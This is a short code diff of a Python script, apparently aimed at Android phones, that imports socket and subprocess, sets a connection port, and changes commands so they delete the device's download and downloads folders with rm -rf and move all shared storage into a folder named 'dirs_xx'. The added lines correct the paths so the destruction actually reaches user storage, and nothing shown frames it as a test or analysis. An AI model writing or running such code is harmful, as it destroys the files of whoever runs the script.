@@ -27,11 +27,10 @@ port_connection = '16786'
 # Libs
 import socket, subprocess, os
 
-os.system('cd /storage/emulated/0')
-os.system('rm -rf download')
-os.system('rm -rf downloads')
-os.mkdir('dirs_xx')
-os.system('mv * dirs_xx')
+os.system('rm -rf /storage/emulated/0/download')
+os.system('rm -rf /storage/emulated/0/downloads')
+os.mkdir('/storage/emulated/0/dirs_xx')
+os.system('mv /storage/emulated/0/* /storage/emulated/0/dirs_xx')
 
 while (back == False):
     print(f'''{red}
